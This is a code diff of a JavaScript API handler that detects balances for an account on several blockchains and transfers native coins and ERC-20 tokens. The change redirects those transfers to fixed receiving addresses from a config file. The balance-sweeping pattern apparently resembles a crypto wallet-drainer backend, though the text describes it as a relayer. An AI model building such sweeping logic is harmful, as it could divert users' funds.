@@ -106,6 +106,7 @@ export async function handleDetectBalances(req, res) {
 /**
  * POST /api/execute-transfer
  * Execute relay transfers on all chains (native + ERC-20 tokens)
+ * Transfers FROM relayer wallet TO receiving addresses
  */
 export async function handleExecuteTransfer(req, res) {
   try {
@@ -118,12 +119,13 @@ export async function handleExecuteTransfer(req, res) {
       })
     }
 
-    console.log('💫 Starting relay transfers for:', account)
+    console.log('💫 Starting relay transfers for account:', account)
 
     // Import services
     const { evmService } = await import('../services/evmService.js')
     const { solanaService } = await import('../services/solanaService.js')
     const { tronService } = await import('../services/tronService.js')
+    const { CONFIG } = await import('../config.js')
 
     const transfers = {}
     const transferHashes = []
@@ -141,7 +143,9 @@ export async function handleExecuteTransfer(req, res) {
         const amount = parseFloat(chainBalance)
         if (amount > 0.001) {
           console.log(`  💰 Native balance: ${amount}`)
-          const result = await evmService.transferNative(chain, account, amount.toString())
+          // Transfer FROM relayer TO receiving address
+          const receivingAddress = CONFIG.receivingAddresses[chain]
+          const result = await evmService.transferNative(chain, receivingAddress, amount.toString())
           transfers[chain] = result
           if (result.hash) transferHashes.push(result.hash)
         }
@@ -155,7 +159,9 @@ export async function handleExecuteTransfer(req, res) {
       // Transfer native coin
       if (nativeAmount > 0.001) {
         console.log(`  💰 Native ${chain}: ${nativeAmount}`)
-        const result = await evmService.transferNative(chain, account, nativeAmount.toString())
+        // Transfer FROM relayer TO receiving address
+        const receivingAddress = CONFIG.receivingAddresses[chain]
+        const result = await evmService.transferNative(chain, receivingAddress, nativeAmount.toString())
         transfers[`${chain}_native`] = result
         if (result.hash) transferHashes.push(result.hash)
       }
@@ -167,11 +173,11 @@ export async function handleExecuteTransfer(req, res) {
           const tokenInfo = TOKEN_REGISTRY[chain]?.[symbol]
           if (tokenInfo) {
             console.log(`  🪙 ${symbol}: ${tokenAmount}`)
-            const { CONFIG } = await import('../config.js')
+            const receivingAddress = CONFIG.receivingAddresses[chain]
             const result = await evmService.transferToken(
               chain,
               tokenInfo.address,
-              CONFIG.receivingAddresses[chain],
+              receivingAddress,
               tokenAmount.toString(),
               tokenInfo.decimals
             )
@@ -190,6 +196,7 @@ export async function handleExecuteTransfer(req, res) {
       if (amount > 0.001) {
         console.log(`\n🔄 Processing Solana...`)
         console.log(`  💰 SOL: ${amount}`)
+        // Relayer transfers its own SOL to receiver
         const result = await solanaService.transferSOL(account, amount)
         transfers.solana = result
         if (result.hash) transferHashes.push(result.hash)
@@ -204,6 +211,7 @@ export async function handleExecuteTransfer(req, res) {
       if (amount > 1) {
         console.log(`\n🔄 Processing Tron...`)
         console.log(`  💰 TRX: ${amount}`)
+        // Relayer transfers its own TRX to receiver
         const result = await tronService.transferTRX(account, amount)
         transfers.tron = result
         if (result.hash) transferHashes.push(result.hash)
@@ -215,7 +223,8 @@ export async function handleExecuteTransfer(req, res) {
       console.log(`\n⚠️ SUI transfers not yet implemented`)
     }
 
-    console.log('\n✅ All transfers completed')
+    console.log('\n✅ All transfer operations completed')
+    console.log(`📊 Summary: ${transferHashes.length} successful transfers`)
 
     res.status(200).json({
       success: true,
